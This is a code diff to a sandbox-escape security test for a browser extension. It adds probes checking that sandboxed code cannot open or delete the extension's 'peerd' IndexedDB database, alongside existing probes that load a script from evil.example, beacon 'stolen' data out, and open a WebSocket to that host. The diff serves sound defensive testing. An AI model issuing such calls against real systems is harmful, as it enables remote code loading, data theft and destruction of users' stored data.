@@ -35,6 +35,11 @@ const freshGlobal = () => {
     fetch: nativeFetch,
     importScripts: function importScripts() { return 'NATIVE-IMPORTSCRIPTS'; },
     caches: { open: () => 'x', match: () => undefined, has: () => false, delete: () => false, keys: () => [] },
+    // indexedDB is a same-origin DURABLE edge on WorkerGlobalScope.prototype — not
+    // network, but the sealed worker runs at the extension origin, so an unsealed
+    // IDBFactory reaches the `peerd` DB (vault blob, always-loaded memory, grants,
+    // audit, and other instances' rows). The seal must block it like caches.
+    indexedDB: { open: () => 'NATIVE-IDB', deleteDatabase: () => 0, databases: () => [], cmp: () => 0 },
   };
   const g: any = Object.create(proto);
   g.XMLHttpRequest = function XMLHttpRequest() {};
@@ -61,7 +66,7 @@ export const scenario: Scenario = {
   title: 'Sandbox escape (Notebook worker, App iframe, WebVM)',
   adversary: 'malicious sandboxed code',
   asset: 'the host origin, the network, and other sandbox instances',
-  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable); the App iframe cannot break out of its inlined-worker shim or navigate the host; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
+  claim: 'Across all three sandbox kinds, confinement holds: the Notebook realm exposes only the audited fetch bridge (raw channels throw, native fetch unrecoverable, bridge un-unseatable) and no same-origin durable store — the Cache API and IndexedDB both throw, so the sealed extension-origin worker cannot reach the `peerd` database; the App iframe cannot break out of its inlined-worker shim or navigate the host; and the WebVM HTTP bridge refuses non-http(s) schemes, scrubs CRLF header injection, drops any smuggled auth field, and confirms body-bearing verbs.',
   threatModelRef: 'INV-6',
   tier: 'unit',
   async run() {
@@ -77,6 +82,8 @@ export const scenario: Scenario = {
       { label: 'importScripts remote code', fn: () => g.importScripts('https://evil.example/x.js') },
       { label: 'sendBeacon exfiltration', fn: () => g.navigator.sendBeacon('https://evil.example/', 'stolen') },
       { label: 'reach the network via the Cache API', fn: () => g.caches.open('x') },
+      { label: 'open the extension-origin IndexedDB (vault blob, memory, grants, audit, sibling instances)', fn: () => g.indexedDB.open('peerd') },
+      { label: 'delete an extension-origin IndexedDB database', fn: () => g.indexedDB.deleteDatabase('peerd') },
       { label: 'construct a WebSocketStream (missing-API stub)', fn: () => new g.WebSocketStream('wss://evil.example/') },
     ];
     for (const c of rawChannels) {
